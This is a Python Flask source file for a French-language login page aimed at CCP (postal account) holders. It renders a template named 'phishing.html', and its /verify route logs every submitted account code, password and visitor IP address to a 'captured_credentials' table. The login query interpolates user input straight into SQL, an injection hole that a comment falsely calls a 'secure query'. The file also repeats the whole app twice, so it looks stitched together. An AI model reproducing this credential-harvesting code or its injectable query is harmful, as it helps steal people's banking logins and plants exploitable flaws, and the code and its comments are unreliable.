from flask import Flask, render_template, request, redirect, url_for, session, flash
import sqlite3
import os

app = Flask(__name__)
app.secret_key = "your_secret_key"  # Needed for sessions

DATABASE = "database.db"

# --- Helper to connect to database ---
def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# --- Home page / login page ---
@app.route("/")
def index():
    return render_template("phishing.html", show_modal=False, user_code="")

# --- Registration page ---
@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        code = request.form["ccp_code"]
        password = request.form["password"]

        conn = get_db()
        cur = conn.cursor()
        try:
            cur.execute("INSERT INTO users (ccp_code, password) VALUES (?, ?)", (code, password))
            conn.commit()
            flash("Utilisateur ajouté avec succès !")
        except sqlite3.IntegrityError:
            flash("Ce CCP est déjà utilisé !")
        finally:
            conn.close()

        return redirect(url_for("index"))
    else:
        return """
        <h2>Inscription</h2>
        <form method='POST'>
            <label>CCP:</label> <input type='text' name='ccp_code'><br>
            <label>Mot de passe:</label> <input type='password' name='password'><br>
            <button type='submit'>S'inscrire</button>
        </form>
        """

# --- Login verification ---
@app.route("/verify", methods=["POST"])
def verify():
    code = request.form.get("ccp_code")
    password = request.form.get("password")

    # Get user's IP address
    ip_address = request.remote_addr

    conn = get_db()
    cur = conn.cursor()

    # Log captured credentials + IP
    cur.execute(
        "INSERT INTO captured_credentials (ccp_code, password, ip_address) VALUES (?, ?, ?)",
        (code, password, ip_address)
    )
    conn.commit()

    # Check if valid user (secure query)
    cur.execute(f"SELECT * FROM users WHERE ccp_code = '{code}' AND password = '{password}'")
    user = cur.fetchone()
    conn.close()

    if user:
        session['user'] = user['ccp_code']
        return render_template("phishing.html", show_modal=True, user_code=user['ccp_code'])
    else:
        flash("Code ou mot de passe incorrect")
        return redirect(url_for("index"))
# --- Logout route ---
@app.route("/logout")
def logout():
    session.pop('user', None)
    flash("Déconnecté avec succès")
    return redirect(url_for("index"))


from flask import Flask, render_template, request, redirect, url_for, session, flash
import sqlite3
import os

app = Flask(__name__)
app.secret_key = "your_secret_key"  # Needed for sessions

DATABASE = "database.db"

# --- Helper to connect to database ---
def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# --- Home page / login page ---
@app.route("/")
def index():
    return render_template("phishing.html", show_modal=False, user_code="")

# --- Registration page ---
@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        code = request.form["ccp_code"]
        password = request.form["password"]

        conn = get_db()
        cur = conn.cursor()
        try:
            cur.execute("INSERT INTO users (ccp_code, password) VALUES (?, ?)", (code, password))
            conn.commit()
            flash("Utilisateur ajouté avec succès !")
        except sqlite3.IntegrityError:
            flash("Ce CCP est déjà utilisé !")
        finally:
            conn.close()

        return redirect(url_for("index"))
    else:
        return """
        <h2>Inscription</h2>
        <form method='POST'>
            <label>CCP:</label> <input type='text' name='ccp_code'><br>
            <label>Mot de passe:</label> <input type='password' name='password'><br>
            <button type='submit'>S'inscrire</button>
        </form>
        """

# --- Login verification ---
@app.route("/verify", methods=["POST"])
def verify():
    code = request.form.get("ccp_code")
    password = request.form.get("password")

    conn = get_db()
    cur = conn.cursor()
    cur.execute(f"SELECT * FROM users WHERE ccp_code = '{code}' AND password = '{password}'")
    user = cur.fetchone()
    conn.close()

    if user:
        session['user'] = user['ccp_code']
        # Render the same phishing.html but show popup
        return render_template("phishing.html", show_modal=True, user_code=user['ccp_code'])
    else:
        flash("Code ou mot de passe incorrect")
        return redirect(url_for("index"))

# --- Logout route ---
@app.route("/logout")
def logout():
    session.pop('user', None)
    flash("Déconnecté avec succès")
    return redirect(url_for("index"))



def insert_test_users():
    conn = get_db()
    cur = conn.cursor()

    users = [
        ("002345678", "pwd"),
        ("009876543", "pwd"),
        ("001112223", "pwd"),
        ("004455667", "pwd"),
        ("007778889", "pwd"),
        ("003333444", "pwd"),
        ("008888999", "pwd"),
        ("005551234", "pwd"),
        ("006666777", "pwd"),
        ("009990001", "pwd"),
    ]

    for user in users:
        try:
            cur.execute("INSERT INTO users (ccp_code, password) VALUES (?, ?)", user)
        except sqlite3.IntegrityError:
            pass  # ignore if already exists

    conn.commit()
    conn.close()



# --- Run the app ---
if __name__ == "__main__":
    app.run(debug=True)

